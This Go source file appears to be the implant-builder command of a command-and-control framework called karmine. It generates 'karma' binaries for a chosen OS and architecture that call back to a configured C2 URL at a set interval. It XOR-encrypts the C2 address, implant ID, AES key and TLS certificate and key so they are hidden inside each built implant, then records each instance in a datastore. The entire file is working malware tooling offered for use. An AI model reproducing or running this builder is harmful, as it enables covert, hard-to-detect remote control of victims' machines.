package main

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"

	"github.com/alecthomas/kingpin"
	"github.com/google/uuid"
	"github.com/pygrum/karmine/config"
	"github.com/pygrum/karmine/datastore"
	"github.com/pygrum/karmine/krypto/kes"
	"github.com/pygrum/karmine/krypto/kryptor"
	"github.com/pygrum/karmine/models"
	log "github.com/sirupsen/logrus"
)

var (
	app      = kingpin.New("new", "create new karmine binary instances")
	karmaCmd = app.Command("karma", "create a karma instance")
	oS       = karmaCmd.Flag("os", "os to compile binary for").Required().String()
	arch     = karmaCmd.Flag("arch", "architecture to compile binary for").Default("amd64").String()
	waitSec  = karmaCmd.Flag("interval", "time interval between c2 callouts in seconds").Default("60").String()

	conf = &models.TmpConf{}
)

func main() {
	var id string
	db, err := datastore.New("karmine")
	if err != nil {
		log.Fatal(err)
	}
	bytes, err := os.ReadFile("/tmp/karmine.tmp")
	if err != nil {
		log.Fatal(err)
	}
	if err := json.Unmarshal(bytes, conf); err != nil {
		log.Fatal(err)
	}
	switch kingpin.MustParse(app.Parse(os.Args[1:])) {
	case karmaCmd.FullCommand():
		c2 := "https://" + conf.LHost + ":" + conf.LPort + conf.Endpoint
		id, err = Karma(*oS, *arch, c2, *waitSec, db)
		if err != nil {
			log.Fatal(err)
		}
	}
	if err = datastore.AddProfile(id, RandString(), kingpin.MustParse(app.Parse(os.Args[1:]))); err != nil {
		log.Fatal(err)
	}
}

func RandString() string {
	b := make([]byte, 6)
	rand.Read(b)
	dst := make([]byte, hex.EncodedLen(len(b)))
	hex.Encode(dst, b)
	return string(dst)
}

func Karma(GOOS, GOARCH, C2, waitSecs string, db *datastore.Kdb) (string, error) {
	conf, err := config.GetFullConfig()
	if err != nil {
		return "", err
	}
	build := conf.SrcPath + "/karma/build.sh"
	aesKeyBytes := kes.NewKey()
	id := uuid.New().String()
	encKey1, encKey2 := kryptor.GetXORKeyPair(32)
	encC2, err := kryptor.Encrypt([]byte(C2), encKey1, encKey2)
	if err != nil {
		return "", err
	}
	encID, err := kryptor.Encrypt([]byte(id), encKey1, encKey2)
	if err != nil {
		return "", err
	}
	aesKey, err := kryptor.Encrypt(aesKeyBytes, encKey1, encKey2)
	if err != nil {
		return "", err
	}
	cert, key, err := config.GetSSLPair()
	if err != nil {
		return "", err
	}
	cbytes, err := os.ReadFile(cert)
	if err != nil {
		return "", err
	}
	kbytes, err := os.ReadFile(key)
	if err != nil {
		return "", err
	}
	cert, err = kryptor.Encrypt(cbytes, encKey1, encKey2)
	if err != nil {
		return "", err
	}
	key, err = kryptor.Encrypt(kbytes, encKey1, encKey2)
	if err != nil {
		return "", err
	}
	cmd := exec.Command(
		build,
		GOOS,
		GOARCH,
		encC2,
		waitSecs,
		cert,
		key,
		aesKey,
		encKey1,
		encKey2,
		encID,
	)
	var cout, cerr bytes.Buffer
	cmd.Stderr = &cerr
	cmd.Stdout = &cout
	if err = cmd.Run(); err != nil {
		fmt.Println(cerr.String())
		return "", fmt.Errorf("could not build new instance: %v", err)
	}
	if len(cerr.String()) != 0 {
		fmt.Println(cerr.String())
	}
	if len(cout.String()) != 0 {
		fmt.Println(cout.String())
	}
	if err = db.CreateNewInstance(id, aesKey, encKey1, encKey2); err != nil {
		return "", err
	}
	return id, nil
}
